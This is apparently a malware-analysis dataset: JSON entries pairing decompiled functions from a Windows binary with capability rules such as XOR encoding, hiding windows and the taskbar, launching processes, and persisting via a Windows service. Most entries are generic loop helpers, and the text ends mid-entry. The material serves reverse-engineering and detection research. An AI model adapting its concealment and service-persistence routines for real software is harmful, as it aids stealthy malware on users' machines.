    "004239a8": {
        "rules": [
            "encode data using XOR",
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint16_t __fastcall fcn.004239a8(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint8_t *in_EAX;\n    \n    uVar1 = 0;\n    do {\n        uVar1 = uVar1 << 5 & 0xff00 | (uVar1 << 5 | uVar1 >> 0xb) ^ *in_EAX;\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "00447430": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00447430(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x84) != 0) {\n        cVar1 = fcn.00458904();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.004585f8();\n            iVar3 = sub.user32.dll_IsWindowVisible(uVar2);\n            if (iVar3 != 0) {\n                cVar1 = (**(**(in_EAX + 0x84) + 0xf0))();\n                if (cVar1 == '\\0') {\n                    fcn.0044726c();\n                }\n                else {\n                    uVar2 = fcn.004585f8(0);\n                    sub.user32.dll_ShowWindow(uVar2);\n                    fcn.004507b4();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "0046da50": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046da50(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46da84, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46da94, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46daa4, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 120
    },
    "0046dab4": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dab4(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46dae8, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46daf8, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46db08, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 120
    },
    "0046db18": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046db18(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46db3c, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46db4c, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "0046db5c": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046db5c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46db80, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46db90, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 90
    },
    "0046dba0": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dba0(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46dbc4, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46dbd4, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 90
    },
    "0046dbe4": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dbe4(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46dc08, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46dc18, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 89
    },
    "0046dc28": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dc28(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowExA(0, 0, 0x46dc44, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 66
    },
    "0046dc4c": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046dc4c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowExA(0, 0, 0x46dc68, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 67
    },
    "00471078": {
        "rules": [
            "hide graphical window",
            "find graphical window",
            "find taskbar",
            "hide the Windows taskbar"
        ],
        "decompiled_code": "\nvoid fcn.00471078(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x471090, 0, 5);\n    sub.user32.dll_ShowWindow(uVar1);\n    return;\n}\n",
        "token_count": 57
    },
    "004710a0": {
        "rules": [
            "hide graphical window",
            "find graphical window",
            "find taskbar",
            "hide the Windows taskbar"
        ],
        "decompiled_code": "\nvoid fcn.004710a0(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x4710b8, 0, 0);\n    sub.user32.dll_ShowWindow(uVar1);\n    return;\n}\n",
        "token_count": 60
    },
    "00488d04": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00488d04(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX == 0) {\n        sub.shell32.dll_ShellExecuteA(0, 0x488d5c, 0x488d54, 0, 0, 5);\n        return;\n    }\n    if (in_EAX == 1) {\n        sub.shell32.dll_ShellExecuteA(0, 0x488d5c, 0x488d64, 0, 0, 5);\n        return;\n    }\n    if (in_EAX == 3) {\n        fcn.00461c1c();\n        return;\n    }\n    if (in_EAX == 4) {\n        fcn.00461c54();\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "00471850": {
        "rules": [
            "persist via Windows service/917cb411848e45f2aea8f119d5b1b71c"
        ],
        "decompiled_code": "\nvoid fcn.00471850(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t iStack132;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x471874;\n    fcn.004059cc();\n    uStack52 = 0x471976;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack60 = 0xf003f;\n    uStack64 = 0;\n    uStack68 = 0;\n    puStack72 = 0x471895;\n    puStack48 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA();\n    if (iVar1 != 0) {\n        uStack76 = 0x47193b;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        fcn.004059dc(0, 0, 0, 0, 0);\n        uVar2 = sub.advapi32.dll_CreateServiceA();\n        fcn.00405728();\n        arg_8h = 0;\n        fcn.00405728();\n        fcn.00405864();\n        fcn.004059dc();\n        fcn.00405728();\n        fcn.004711e8(arg_8h);\n        sub.advapi32.dll_CloseServiceHandle(uVar2);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = iVar1;\n        iStack132 = iVar1;\n    }\n    *in_FS_OFFSET = iStack132;\n    fcn.00405554(0x47197d);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 504
    },
    "00472924": {
        "rules": [
            "set file attributes"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472924(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x472936;\n    fcn.004059cc();\n    uStack20 = 0x472969;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(param_2);\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack24 = 0x472970;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 183
    },
    "00404100": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404100(uint32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = in_EAX;\n    if (0xff < param_1) {\n        param_1 = 0xff;\n    }\n    do {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (cVar1 == '\\0') break;\n        pcVar2 = pcVar2 + 1;\n        *pcVar2 = cVar1;\n        param_1 = param_1 - 1;\n    } while (param_1 != 0);\n    *in_EAX = pcVar2 - in_EAX;\n    return;\n}\n",
        "token_count": 176
    },
    "004046b4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004046b4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        in_EAX = *(iVar1 + -0x24);\n        if (*(iVar1 + -0x40) != 0) {\n            fcn.004060ac();\n        }\n    } while (in_EAX != NULL);\n    return;\n}\n",
        "token_count": 95
    },
    "00404800": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00404800(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX != NULL) {\n        while (*in_EAX != param_2) {\n            in_EAX = *(*in_EAX + -0x24);\n            if (in_EAX == NULL) {\n                if (*0x495008 != NULL) {\n                    (**0x495008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "0040487c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040487c(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == param_2) {\n            return 0x1;\n        }\n        piVar1 = *(in_EAX + -0x24);\n        if (piVar1 == NULL) break;\n        in_EAX = *piVar1;\n    }\n    return piVar1;\n}\n",
        "token_count": 117
    },
    "00405110": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405110(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    iVar3 = *0x4977d4;\n    puStack20 = &stack0xfffffffc;\n    if (*0x4977d0 != 0) {\n        iVar1 = *(*0x4977d0 + 4);\n        uStack24 = 0x405159;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        if (0 < iVar3) {\n            do {\n                iVar3 = iVar3 + -1;\n                pcVar2 = *(iVar1 + 4 + iVar3 * 8);\n                *0x4977d4 = iVar3;\n                if (pcVar2 != NULL) {\n                    (*pcVar2)();\n                }\n            } while (0 < iVar3);\n        }\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00405174": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405174(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*0x4977d0 != NULL) {\n        iVar1 = **0x4977d0;\n        iVar4 = 0;\n        iVar2 = (*0x4977d0)[1];\n        uStack28 = 0x4051c1;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        if (0 < iVar1) {\n            do {\n                pcVar3 = *(iVar2 + iVar4 * 8);\n                iVar4 = iVar4 + 1;\n                *0x4977d4 = iVar4;\n                if (pcVar3 != NULL) {\n                    (*pcVar3)();\n                }\n            } while (iVar4 < iVar1);\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00405cd8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405cd8(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    iVar3 = 0;\n    if (param_2 != NULL) {\n        iVar3 = *(param_2 + -4);\n    }\n    iVar2 = fcn.00404030();\n    if ((*(iVar2 + 4) == -0x284e) || (cVar1 = fcn.00403f98(iVar3, param_2),  cVar1 != '\\0')) {\n        while( true ) {\n            puVar5 = *(iVar2 + 0x14) + *(iVar2 + 0xc);\n            iVar4 = *(iVar2 + 8) - *(iVar2 + 0xc);\n            if (iVar3 < iVar4) break;\n            *(iVar2 + 0xc) = *(iVar2 + 0xc) + iVar4;\n            iVar3 = iVar3 - iVar4;\n            for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *param_2;\n                param_2 = param_2 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            iVar4 = (**(iVar2 + 0x1c))();\n            if (iVar4 != 0) {\n                fcn.0040307c();\n                return iVar2;\n            }\n        }\n        *(iVar2 + 0xc) = *(iVar2 + 0xc) + iVar3;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *param_2;\n            param_2 = param_2 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 427
    },
    "004061e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n// WARNING: Removing unreachable block (ram,0x00406166)\n// WARNING: Removing unreachable block (ram,0x0040614c)\n\nvoid __fastcall fcn.004061e4(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if (cVar1 == '\\n') {\n        fcn.00405530();\n    }\n    else if (cVar1 == '\\v') {\n        fcn.00405d28();\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.004060e0();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.004060f8();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.004060ac();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.0040700c();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x495008 != NULL) {\n                (**0x495008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n        do {\n            fcn.00406934();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    return;\n}\n",
        "token_count": 540
    },
    "0040678c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.0040678c(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.00405530();\n            }\n            else {\n                fcn.00405554();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405d28();\n            }\n            else {\n                fcn.00405d40();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.004060e0();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.004060f8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.004060ac();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.0040700c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x495008 != NULL) {\n                    (**0x495008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n            do {\n                fcn.00406934();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "00406a10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00406a10(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    piVar2 = *0x491040;\n    if (*0x491040 != NULL) {\n        do {\n            if (((in_EAX == piVar2[1]) || (in_EAX == piVar2[2])) || (in_EAX == piVar2[3])) {\n                iVar1 = fcn.004069c8();\n                return iVar1;\n            }\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n    }\n    return in_EAX;\n}\n",
        "token_count": 150
    },
    "00406a48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00406a48(void)\n\n{\n    char *in_EAX;\n    \n    while ((*in_EAX != '\\0' && (*in_EAX != '\\\\'))) {\n        in_EAX = sub.user32.dll_CharNextA();\n    }\n    return in_EAX;\n}\n",
        "token_count": 62
    },
    "00406ecc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406ecc(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if ((*0x491044 == NULL) || ((*0x491044)[1] != in_EAX)) {\n        ppiVar2 = *0x491044;\n        if (*0x491044 != NULL) {\n            do {\n                ppiVar1 = *ppiVar2;\n                if ((ppiVar1 != NULL) && (ppiVar1[1] == in_EAX)) {\n                    *ppiVar2 = *ppiVar1;\n                    fcn.00402f1c();\n                    return;\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n    }\n    else {\n        *0x491044 = **0x491044;\n        fcn.00402f1c();\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "00406f9c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406f9c(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint *var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    uStack16 = 0x407000;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_4h = in_EAX;\n    fcn.00406f30();\n    *in_FS_OFFSET = uStack20;\n    puVar1 = *0x491040;\n    if (var_4h == *0x491040) {\n        *0x491040 = *var_4h;\n    }\n    else {\n        for (; puVar1 != NULL; puVar1 = *puVar1) {\n            if (*puVar1 == var_4h) {\n                *puVar1 = *var_4h;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "00409bd0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409bd0(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00405ec8();\n    for (iVar2 = 1; (iVar2 <= iVar1 && (*(in_EAX + -2 + iVar2 * 2) < 0x21)); iVar2 = iVar2 + 1) {\n    }\n    if (iVar1 < iVar2) {\n        fcn.00405d28();\n    }\n    else {\n        for (; *(in_EAX + -2 + iVar1 * 2) < 0x21; iVar1 = iVar1 + -1) {\n        }\n        fcn.00405f58(param_2);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "0040a9fc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a9fc(int32_t param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = 0;\n    iVar6 = param_1;\n    pcVar7 = param_2;\n    if (param_1 != 0) {\n        do {\n            if (iVar6 == 0) break;\n            iVar6 = iVar6 + -1;\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        param_1 = param_1 - iVar6;\n        bVar8 = true;\ncode_r0x0040aa15:\n        do {\n            if (param_1 != 0) {\n                param_1 = param_1 + -1;\n                pcVar1 = param_2 + 1;\n                pcVar7 = in_EAX + 1;\n                bVar8 = *in_EAX == *param_2;\n                in_EAX = pcVar7;\n                param_2 = pcVar1;\n                if (bVar8) goto code_r0x0040aa15;\n            }\n            if (bVar8) {\n                return;\n            }\n            uVar3 = in_EAX[-1];\n            uVar5 = uVar4 & 0xffffff00 | uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar5 = uVar4 & 0xffffff00 | uVar3 - 0x20;\n            }\n            uVar3 = param_2[-1];\n            uVar4 = uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar4 = uVar3 - 0x20;\n            }\n            uVar4 = uVar5 - uVar4;\n            bVar8 = uVar4 == 0;\n        } while (bVar8);\n    }\n    return;\n}\n",
        "token_count": 504
    },
    "0040aa40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040aa40(uint param_1, char param_2)\n\n{\n    char *in_EAX;\n    \n    while( true ) {\n        if (param_2 == *in_EAX) {\n            return in_EAX;\n        }\n        if (*in_EAX == '\\0') break;\n        in_EAX = in_EAX + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 89
    },
    "0040aa54": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040aa54(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    bool bVar9;\n    \n    if ((in_EAX != NULL) && (param_2 != NULL)) {\n        uVar2 = 0xffffffff;\n        pcVar7 = param_2;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar2 - 1;\n        if (uVar3 != 0) {\n            uVar4 = 0xffffffff;\n            pcVar7 = in_EAX;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = ~uVar4 - uVar3;\n            bVar9 = iVar5 == 0;\n            if (uVar3 <= ~uVar4 && !bVar9) {\n                do {\n                    pcVar7 = param_2 + 1;\n                    pcVar8 = in_EAX;\n                    do {\n                        in_EAX = pcVar8;\n                        if (iVar5 == 0) break;\n                        iVar5 = iVar5 + -1;\n                        in_EAX = pcVar8 + 1;\n                        bVar9 = *param_2 == *pcVar8;\n                        pcVar8 = in_EAX;\n                    } while (!bVar9);\n                    iVar6 = ~uVar2 - 2;\n                    pcVar8 = in_EAX;\n                    if (!bVar9) {\n                        return NULL;\n                    }\n                    do {\n                        if (iVar6 == 0) break;\n                        bVar9 = *pcVar7 == *pcVar8;\n                        iVar6 = iVar6 + -1;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar7 = pcVar7 + 1;\n                    } while (bVar9);\n                    if (bVar9) {\n                        return in_EAX + -1;\n                    }\n                } while( true );\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 579
    },
    "0040acca": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040acca(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *puVar3;\n    char cVar4;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint extraout_ECX;\n    unkbyte3 Var8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint8_t *puVar11;\n    float10 fVar12;\n    float10 fVar13;\n    float10 fVar14;\n    uint var_69h;\n    uint var_59h;\n    uint var_49h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    uint var_4h;\n    char cVar5;\n    \n    iVar9 = *(unaff_EBP + -0xc);\n    if (iVar9 <= *(unaff_EBP + 8)) {\n        *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n    // WARNING: Could not recover jumptable at 0x0040acea. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x40acf1\n        (**(*(*(unaff_EBP + 0xc) + iVar9 * 8 + 4) * 4 + 0x40acf1))();\n        return;\n    }\n    do {\n        fcn.0040aef7();\n        puVar3 = fcn.0040ab18();\n        uVar10 = *(unaff_EBP + -0x24);\n        if (0x20 < uVar10) {\n            uVar10 = 0;\n        }\n        cVar5 = extraout_ECX;\n        Var8 = extraout_ECX >> 8;\n        cVar4 = cVar5 + -0x44;\n        if (cVar4 == '\\0') break;\n        cVar4 = '\\x10';\n        Var8 = 0;\n        if (cVar5 == 'X') break;\n        cVar4 = '\\n';\n        Var8 = 0;\n    } while (cVar5 != 'U');\n    iVar6 = CONCAT31(Var8, cVar4);\n    if ((cVar4 == '\\0') && (iVar6 = 10,  (*(puVar3 + 4) & 0x80000000) != 0)) {\n        fcn.00409dc4(-*puVar3, -(*(puVar3 + 4) + (*puVar3 != 0)));\n        *(unaff_EBP + -0x4a) = 0x2d;\n        return;\n    }\n    if ((*(puVar3 + 4) & 0x80000000) == 0) {\n        fVar14 = *puVar3;\n    }\n    else {\n        fVar14 = 0x7fffffffffffffff + 1 + (*puVar3 & 0x7fffffffffffffff);\n    }\n    fVar12 = iVar6;\n    puVar11 = unaff_EBP + -0x49;\n    do {\n        puVar11 = puVar11 + -1;\n        fVar13 = fVar14 - (fVar14 / fVar12) * fVar12;\n        fVar14 = fVar14 / fVar12;\n        var_4h._0_1_ = ROUND(fVar13);\n        uVar2 = var_4h + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = var_4h + 0x37;\n        }\n        *puVar11 = uVar2;\n    } while (1 <= fVar14);\n    uVar7 = (unaff_EBP + -0x49) - puVar11;\n    iVar9 = uVar10 - uVar7;\n    if (uVar7 <= uVar10 && iVar9 != 0) {\n        iVar1 = -iVar9;\n        while (iVar9 = iVar9 + -1,  iVar9 != 0) {\n            (puVar11 + iVar1)[iVar9] = 0x30;\n        }\n        puVar11[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 984
    },
    "0040b683": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040b683(void)\n\n{\n    char cVar1;\n    char *unaff_ESI;\n    \n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 == '\\0') {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n    } while (cVar1 == ' ');\n    return;\n}\n",
        "token_count": 85
    },
    "0040c954": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c954(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_2;\n    while( true ) {\n        iVar1 = fcn.0040580c();\n        if ((iVar1 < iVar2) || (*(in_EAX + -1 + iVar2) != ' ')) break;\n        iVar2 = iVar2 + 1;\n    }\n    *param_2 = iVar2;\n    return;\n}\n",
        "token_count": 127
    },
    "0040cb20": {
        "rules": [
            "contain loop"
        ],
